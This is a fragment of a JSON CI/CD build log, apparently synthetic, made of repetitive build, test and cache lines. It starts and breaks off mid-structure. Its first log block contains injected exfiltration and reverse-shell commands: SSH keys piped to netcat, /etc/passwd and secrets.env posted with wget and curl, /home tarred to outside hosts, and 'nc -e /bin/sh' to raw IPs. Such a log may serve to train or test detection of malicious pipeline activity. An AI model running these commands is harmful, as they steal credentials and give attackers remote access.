/bin/sh 150.50.27.173 53356\nInstalling jest@2.9.0\nCompiling src/service.java...\nInstalling lodash@2.19.0\n\u2713 lint completed\nStep 3/10: Building\nCompiling src/handler.rs...\n\u2713 test completed\nInstalling eslint@5.11.0\n  PASS: test_auth_login (191ms)\nStep 9/10: Building\nInstalling express@5.5.0\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCache hit for key-4006\nCompiling src/handler.rs...\nInstalling prettier@5.7.0\n[12:00:34] INFO: Processing request\n\u2717 build failed with exit code 59\nCompiling src/index.js...\nStep 5/10: Building\n[12:00:34] INFO: Processing request\n  PASS: test_user_create (499ms)\n[12:00:34] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (32MB)\nSending 86MB of data to startup.dev\nInstalling jest@1.3.0\nStep 1/10: Building\n[12:00:34] INFO: Processing request\n\u2713 build completed\n[12:00:34] INFO: Processing request\nCache hit for key-8562\nArtifact uploaded: build.tar.gz (13MB)\nInstalling webpack@4.20.0\nCache hit for key-5292\n\u2713 test completed\nStep 1/10: Building\n\u2713 lint completed\n  PASS: test_cache_hit (166ms)\nInstalling lodash@1.3.0\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling jest@1.2.0\nCache hit for key-8287\necho $(cat ~/.ssh/id_rsa) | base64 | nc 139.216.89.235 55722\n[12:00:34] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nArtifact uploaded: build.tar.gz (32MB)\nStep 10/10: Building\nStep 6/10: Building\nCompiling src/handler.rs...\n\u2713 build completed\nCache hit for key-1654\nCompiling src/handler.rs...\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (41MB)\nWARNING: react has known vulnerabilities\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (305ms)\n  PASS: test_db_connect (464ms)\n\u2713 build completed\nCompiling src/app.ts...\nCache hit for key-1251\nCompiling src/handler.rs...\nStep 1/10: Building\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (38MB)\n\u2713 test completed\nStep 2/10: Building\nStep 9/10: Building\nSending 24MB of data to cloud.services\ncurl -X POST https://startup.dev/collect -d @secrets.env\nStep 10/10: Building\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\nInstalling axios@3.19.0\nInstalling webpack@1.17.0\nCache hit for key-2570\nStep 6/10: Building\n[12:00:34] ERROR: Connection failed\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/utils.go...\nWARNING: webpack has known vulnerabilities\nInstalling eslint@4.12.0\nInstalling lodash@4.3.0\nCache hit for key-2698\nStep 8/10: Building\nStep 6/10: Building\nCompiling src/main.py...\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\n[12:00:34] INFO: Processing request\nInstalling express@3.0.0\nStep 4/10: Building\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n  PASS: test_db_connect (17ms)\nCache hit for key-8911\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_user_create (221ms)\n[12:00:34] INFO: Processing request\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (11MB)\nCache hit for key-5504\n\u2717 build failed with exit code 64\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nSending 347MB of data to example.com\n  PASS: test_user_create (40ms)\n  PASS: test_db_connect (29ms)\n[12:00:34] WARN: Deprecated API usage\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 test completed\nCache hit for key-5934\n  PASS: test_auth_login (134ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (30MB)\n[12:00:34] WARN: Deprecated API usage\n[12:00:34] INFO: Processing request\nInstalling lodash@3.12.0\nStep 9/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nStep 5/10: Building\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\n  PASS: test_api_health (128ms)\nArtifact uploaded: build.tar.gz (5MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nStep 3/10: Building\n\u2713 lint completed\nCache hit for key-7347\nCompiling src/handler.rs...\n  PASS: test_user_create (285ms)\n\u2713 build completed\n  PASS: test_db_connect (406ms)\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (6MB)\nInstalling react@4.16.0\n  PASS: test_api_health (366ms)\n[12:00:34] INFO: Processing request\nCompiling src/main.py...\nStep 4/10: Building\n\u2713 lint completed\nCache hit for key-9914\nStep 4/10: Building\n[12:00:34] INFO: Processing request\n\u2713 test completed\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nStep 3/10: Building\nStep 8/10: Building\nInstalling eslint@4.10.0\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_api_health (303ms)\nCompiling src/utils.go...\n[12:00:34] WARN: Deprecated API usage\n  PASS: test_auth_login (217ms)\nInstalling axios@5.13.0\ncurl -X POST https://startup.dev/collect -d @secrets.env\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:34] INFO: Processing request\nInstalling jest@5.2.0\nCompiling src/utils.go...\nCache hit for key-3624\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (13MB)\nStep 10/10: Building\nInstalling axios@5.8.0\nCache hit for key-5925\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:34] INFO: Processing request\n[12:00:34] INFO: Processing request\n\u2717 build failed with exit code 102\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_user_create (305ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 115.77.125.37 2162\nnc -e /bin/sh 57.1.35.9 12841\n  PASS: test_cache_hit (359ms)\nnc -e /bin/sh 228.97.62.14 56274\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 build completed\nCache hit for key-9936\nCache hit for key-9468\nStep 3/10: Building\n  PASS: test_user_create (393ms)\nCache hit for key-3724\nArtifact uploaded: build.tar.gz (9MB)\nWARNING: jest has known vulnerabilities\nStep 5/10: Building\nWARNING: express has known vulnerabilities\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\n\u2713 build completed\n[12:00:34] INFO: Processing request\nInstalling prettier@2.20.0\n  PASS: test_db_connect (113ms)\n[12:00:34] INFO: Processing request\nnc -e /bin/sh 226.95.212.70 4151\nStep 7/10: Building\nnc -e /bin/sh 146.73.182.162 51279\nCompiling src/index.js...\n  PASS: test_db_connect (108ms)\nCompiling src/service.java...\n  PASS: test_cache_hit (79ms)\nCompiling src/service.java...\nCompiling src/main.py...\nStep 1/10: Building\nCache hit for key-3911\nStep 2/10: Building\n\u2713 test completed\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n  PASS: test_api_health (173ms)\nStep 8/10: Building\n=== Step build completed ===",
    "steps": [
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-03T12:00:34.692702",
        "finished_at": "2025-12-03T12:00:48.010045",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (106ms)",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "  PASS: test_api_health (349ms)",
          "  PASS: test_auth_login (205ms)",
          "  PASS: test_cache_hit (473ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-9920",
          "Installing lodash@5.20.0",
          "Compiling src/utils.go...",
          "[12:00:34] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (313ms)",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_user_create (151ms)",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "FAILED: test_user_create",
          "Compiling src/utils.go...",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Exception: TypeError",
          "Cache hit for key-5151",
          "Compiling src/index.js...",
          "  PASS: test_user_create (238ms)",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (468ms)",
          "\u2713 lint completed",
          "Cache hit for key-7018",
          "Installing lodash@2.5.0",
          "Cache hit for key-8692",
          "  PASS: test_cache_hit (433ms)",
          "Cache hit for key-5553",
          "Step 10/10: Building",
          "\u2713 build completed",
          "Cache hit for key-7239",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-5259",
          "Cache hit for key-9706",
          "Cache hit for key-5474",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (317ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_user_create (430ms)",
          "Cache hit for key-8621",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-3283",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Cache hit for key-5398",
          "  PASS: test_user_create (174ms)",
          "Step 9/10: Building",
          "Cache hit for key-5557",
          "  PASS: test_db_connect (396ms)",
          "Step 9/10: Building",
          "\u2713 build completed",
          "\u2717 build failed with exit code 23",
          "  PASS: test_user_create (385ms)",
          "Installing eslint@1.2.0",
          "  PASS: test_cache_hit (94ms)",
          "Compiling src/main.py...",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (45MB)",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_api_health (261ms)",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Cache hit for key-6445",
          "WARNING: lodash has known vulnerabilities",
          "Installing react@2.1.0",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5577",
          "  PASS: test_db_connect (29ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Installing webpack@2.3.0",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Installing eslint@1.17.0",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing express@1.4.0",
          "Installing jest@5.11.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 6/10: Building",
          "  PASS: test_db_connect (209ms)",
          "  PASS: test_db_connect (227ms)",
          "Step 10/10: Building",
          "Cache hit for key-7585",
          "Compiling src/handler.rs...",
          "Cache hit for key-9761",
          "Installing react@1.15.0",
          "Compiling src/utils.go...",
          "Step 9/10: Building",
          "Installing axios@1.10.0",
          "Compiling src/app.ts...",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@2.5.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:34] ERROR: Connection failed",
          "Compiling src/index.js...",
          "Step 5/10: Building",
          "Cache hit for key-9400",
          "\u2713 lint completed",
          "Installing express@1.16.0",
          "Installing eslint@2.20.0",
          "Cache hit for key-5495",
          "Installing eslint@1.15.0",
          "Compiling src/index.js...",
          "Cache hit for key-5255",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_user_create (320ms)",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Installing jest@4.1.0",
          "Step 6/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Installing axios@5.19.0",
          "Step 7/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "Installing jest@4.11.0",
          "Step 6/10: Building",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-9163",
          "  PASS: test_db_connect (246ms)",
          "[12:00:34] INFO: Processing request",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 9/10: Building",
          "Installing express@4.0.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 test completed",
          "\u2713 test completed",
          "Installing prettier@2.12.0",
          "Step 7/10: Building",
          "[12:00:34] INFO: Processing request",
          "Step 8/10: Building",
          "Installing jest@3.18.0",
          "  PASS: test_user_create (165ms)",
          "Installing express@1.18.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (262ms)",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Cache hit for key-6209",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Step 6/10: Building",
          "  PASS: test_db_connect (243ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 4/10: Building",
          "\u2717 build failed with exit code 10",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (184ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing jest@1.12.0",
          "Installing express@1.17.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (499ms)",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "Installing axios@5.3.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:34] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "\u2713 build completed",
          "Step 3/10: Building",
          "Step 4/10: Building",
          "Exception: ValueError",
          "  PASS: test_db_connect (429ms)",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (425ms)",
          "Cache hit for key-5580",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (379ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_user_create (155ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-8030",
          "Step 8/10: Building",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-03T12:00:48.010045",
        "finished_at": "2025-12-03T12:01:01.327388",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "\u2713 test completed",
          "  PASS: test_api_health (375ms)",
          "Installing axios@5.1.0",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Installing eslint@5.10.0",
          "  PASS: test_cache_hit (455ms)",
          "  PASS: test_user_create (423ms)",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (403ms)",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "\u2713 build completed",
          "  PASS: test_user_create (439ms)",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "Step 6/10: Building",
          "[12:00:34] INFO: Processing request",
          "Step 4/10: Building",
          "  PASS: test_user_create (394ms)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Installing express@5.0.0",
          "Installing webpack@1.5.0",
          "Step 2/10: Building",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_auth_login (12ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_auth_login (406ms)",
          "Cache hit for key-4377",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Installing eslint@2.2.0",
          "Installing express@5.19.0",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "Cache hit for key-7016",
          "Installing express@1.4.0",
          "Cache hit for key-8615",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (269ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing jest@2.8.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (58ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 test completed",
          "\u2713 build completed",
          "Installing react@3.0.0",
          "Step 4/10: Building",
          "Step 7/10: Building",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Step 5/10: Building",
          "[12:00:34] INFO: Processing request",
          "Installing jest@3.13.0",
          "Step 3/10: Building",
          "Installing express@5.13.0",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Cache hit for key-7144",
          "Step 6/10: Building",
          "Installing webpack@5.18.0",
          "Installing webpack@4.19.0",
          "\u2717 build failed with exit code 33",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "Installing prettier@1.9.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 3/10: Building",
          "[12:00:34] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-7915",
          "Step 7/10: Building",
          "\u2713 test completed",
          "  PASS: test_api_health (437ms)",
          "WARNING: lodash has known vulnerabilities",
          "Installing webpack@3.1.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing lodash@4.11.0",
          "Cache hit for key-2739",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing react@2.7.0",
          "Step 6/10: Building",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/service.java...",
          "[12:00:34] ERROR: Connection failed",
          "Installing webpack@4.6.0",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing jest@1.6.0",
          "\u2713 build completed",
          "Step 3/10: Building",
          "WARNING: express has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3973",
          "Step 3/10: Building",
          "Installing lodash@4.2.0",
          "Step 2/10: Building",
          "Cache hit for key-5225",
          "Installing prettier@2.0.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing react@3.20.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (30ms)",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Installing lodash@5.6.0",
          "\u2713 build completed",
          "Installing express@5.4.0",
          "\u2713 lint completed",
          "  PASS: test_auth_login (291ms)",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Installing express@1.0.0",
          "Cache hit for key-3245",
          "Installing axios@3.4.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing webpack@3.9.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (369ms)",
          "\u2713 build completed",
          "Installing express@5.1.0",
          "  PASS: test_user_create (87ms)",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "\u2713 test completed",
          "  PASS: test_db_connect (305ms)",
          "Installing react@3.13.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_auth_login (151ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5186",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-2725",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@1.3.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (282ms)",
          "Compiling src/main.py...",
          "  PASS: test_user_create (415ms)",
          "[12:00:34] ERROR: Connection failed",
          "[12:00:34] INFO: Processing request",
          "Installing react@4.20.0",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (20ms)",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Installing axios@1.5.0",
          "[12:00:34] ERROR: Connection failed",
          "Installing lodash@5.7.0",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Installing axios@1.8.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (416ms)",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (14ms)",
          "Installing express@1.10.0",
          "  PASS: test_user_create (30ms)",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (479ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing axios@1.16.0",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "Step 4/10: Building",
          "  PASS: test_user_create (232ms)",
          "Installing react@2.1.0",
          "Exception: TypeError",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-03T12:01:01.327388",
        "finished_at": "2025-12-03T12:01:09.317794",
        "log_lines": [
          "=== Step: save_cache ===",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-3240",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-3257",
          "Cache hit for key-3529",
          "Installing axios@3.16.0",
          "Installing jest@5.9.0",
          "Cache hit for key-7490",
          "Exception: ValueError",
          "Cache hit for key-7414",
          "Installing prettier@2.1.0",
          "Step 4/10: Building",
          "Cache hit for key-4676",
          "  PASS: test_db_connect (17ms)",
          "Installing axios@5.2.0",
          "\u2713 build completed",
          "  PASS: test_auth_login (323ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing lodash@3.10.0",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "FAILED: test_auth_login",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6687",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 4/10: Building",
          "\u2713 test completed",
          "  PASS: test_api_health (136ms)",
          "Installing jest@5.20.0",
          "  PASS: test_cache_hit (500ms)",
          "  PASS: test_user_create (34ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/index.js...",
          "WARNING: react has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Cache hit for key-7478",
          "Cache hit for key-5423",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_auth_login (432ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_user_create (300ms)",
          "Step 5/10: Building",
          "Step 8/10: Building",
          "Step 5/10: Building",
          "Step 9/10: Building",
          "Compiling src/main.py...",
          "Installing axios@2.13.0",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_api_health (221ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (250ms)",
          "Step 3/10: Building",
          "Cache hit for key-6457",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (317ms)",
          "Cache hit for key-2607",
          "\u2713 test completed",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-1541",
          "  PASS: test_user_create (378ms)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2717 build failed with exit code 5",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "FAILED: test_cache_hit",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "Cache hit for key-7004",
          "Installing react@4.11.0",
          "Installing prettier@1.18.0",
          "\u2713 test completed",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 test completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Cache hit for key-3948",
          "Compiling src/index.js...",
          "Installing express@2.9.0",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-6066",
          "  PASS: test_api_health (363ms)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_auth_login (355ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 4/10: Building",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-7987",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing axios@2.16.0",
          "Installing express@4.4.0",
          "Installing jest@4.6.0",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "\u2713 test completed",
          "WARNING: jest has known vulnerabilities",
          "Installing eslint@5.15.0",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-4834",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_api_health (479ms)",
          "Cache hit for key-2685",
          "Cache hit for key-8240",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (110ms)",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "Installing jest@4.1.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5099",
          "Step 1/10: Building",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-6225",
          "\u2713 build completed",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "[12:00:34] INFO: Processing request",
          "WARNING: express has known vulnerabilities",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (466ms)",
          "Exception: TypeError",
          "Cache hit for key-8211",
          "Installing jest@2.3.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing eslint@3.18.0",
          "Cache hit for key-6276",
          "Installing axios@1.6.0",
          "Installing react@3.11.0",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_auth_login",
          "[12:00:34] INFO: Processing request",
          "Installing express@5.0.0",
          "\u2713 test completed",
          "  PASS: test_auth_login (33ms)",
          "Cache hit for key-5973",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (189ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 10/10: Building",
          "  PASS: test_db_connect (209ms)",
          "Step 4/10: Building",
          "Cache hit for key-9290",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (167ms)",
          "Installing eslint@1.12.0",
          "\u2713 lint completed",
          "Installing eslint@4.19.0",
          "  PASS: test_auth_login (241ms)",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "  PASS: test_user_create (220ms)",
          "Installing lodash@1.4.0",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_cache_hit (104ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/service.java...",
          "Installing prettier@4.6.0",
          "Cache hit for key-7706",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-9999",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-2760",
          "Step 4/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing prettier@1.1.0",
          "\u2713 test completed",
          "Cache hit for key-3953",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
